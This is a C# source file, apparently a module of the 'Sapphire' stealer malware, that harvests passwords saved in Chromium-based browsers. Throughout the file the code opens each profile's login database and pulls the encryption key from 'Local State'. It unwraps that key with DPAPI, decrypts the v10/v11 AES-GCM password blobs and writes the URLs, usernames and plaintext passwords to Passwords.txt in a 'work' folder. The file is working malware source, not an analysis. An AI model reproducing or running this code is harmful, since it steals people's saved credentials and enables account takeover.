using System;
using System.Linq;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using Sapphire.Modules.Helpers;
using Sapphire.Modules.Steal.Helpers;

namespace Sapphire.Modules.Passwords.Chromium
{
    class Chromium
    {
        public static void Get()
        {
            var loginData = new List<Format.LoginData>();
            foreach (var p in Paths.ChromiumPaths)
                loginData.AddRange(Passwords(p.Value, p.Key));

            if (loginData.Count > 0)
            {
                string path = FileManager.CreateDirectory("work");

                if (string.IsNullOrEmpty(path))
                    throw new Exception("[ERROR] can't create work directory");

                File.Create(path + "Passwords.txt").Close();

                foreach (var data in loginData.ToArray())
                    File.AppendAllText(path + "Passwords.txt", $"URL: {data.url}\nLogin: {data.login}\nPassword: {data.password}\nApplication: {data.browser}\n--------------------------------\n");
            }
        }
        public static List<Format.LoginData> Passwords(string path, string browser)
        {
            List<string> ldFiles = Paths.GetUserData(path); // Get profiles
            List<Format.LoginData> data = new List<Format.LoginData>();
            foreach (string ld in ldFiles.ToArray())
            {
                if (!File.Exists(ld))
                {
                    continue;
                }
                SQLite sql;
                try
                {
                    sql = new SQLite(ld); // open database
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[ERROR_CANT_OPEN_DB]{e.Message}");
                    return null;
                }
                sql.ReadTable("logins"); // read table logins

                for (int i = 0; i < sql.GetRowCount(); i++)
                {
                    try
                    {
                        string url = sql.GetValue(i, 0);
                        string login = sql.GetValue(i, 3);
                        string password = sql.GetValue(i, 5);

                        if (!string.IsNullOrEmpty(password))
                        {
                            // Checking the encryption version
                            if (password.StartsWith("v10") || password.StartsWith("v11"))
                            {                                
                                byte[] secretKey = GetKey(Directory.GetParent(ld).Parent.FullName);
                                if (secretKey is null) // if null skip
                                    continue;

                                password = DecryptPassword(System.Text.Encoding.Default.GetBytes(password), secretKey);
                            }
                            else
                                password = System.Text.Encoding.UTF8.GetString(ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(password), null, 0));
                        }

                        
                        if (login.Trim().Length > 0 && password.Trim().Length > 0) // Checking for valid
                            data.Add(new Format.LoginData() { url = url, login = login, password = password, browser = browser });
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[ERROR_CANT_GET_PASSWORD]{e.Message}");
                        return null;
                    }
                }
            }
            return data;
        }
        private static string DecryptPassword(byte[] encryptedData, byte[] secretKey)
        {
            // we get the salt, skip the prefix v10
            byte[] iv = encryptedData.Skip(3).Take(12).ToArray();
            try
            {
                byte[] Buffer = encryptedData.Skip(15).Take(encryptedData.Length - 15).ToArray();   
                byte[] tag = Buffer.Skip(Buffer.Length - 16).Take(16).ToArray(); 
                byte[] data = Buffer.Skip(0).Take(Buffer.Length - tag.Length).ToArray();

                AesGCM aes = new AesGCM();
                var result = System.Text.Encoding.UTF8.GetString(aes.Decrypt(secretKey, iv, null, data, tag));

                return result;
            }
            catch(Exception e) 
            {
                Console.WriteLine($"[ERROR_DECRYPT_METHOD]{e.Message}\n{e.StackTrace}");
                return null;
            }
        }
        private static byte[] GetKey(string browserPath)
        {
            string filePath = browserPath + "\\Local State";
            if (!File.Exists(filePath))
            {
                return null;
            }
            // We read the data from the Local State file (the secret key is stored there)
            string key = File.ReadAllText(filePath);
            // get key
            key = SimpleJSON.JSON.Parse(key)["os_crypt"]["encrypted_key"];

            try
            {
                byte[] keyBytes = System.Text.Encoding.Default.GetBytes(System.Text.Encoding.Default.GetString(Convert.FromBase64String(key)).Remove(0, 5)); // Конвертируем из base64 в string после удаляем префикс DPAPI и получаем байты
                byte[] secretKey = ProtectedData.Unprotect(keyBytes, null, 0); 
                return secretKey;
            }
            catch(Exception e) 
            {
                Console.WriteLine($"[ERROR_GETSECRETKEY_METHOD]{e.Message}");
                return null;
            }
        }
    }
}
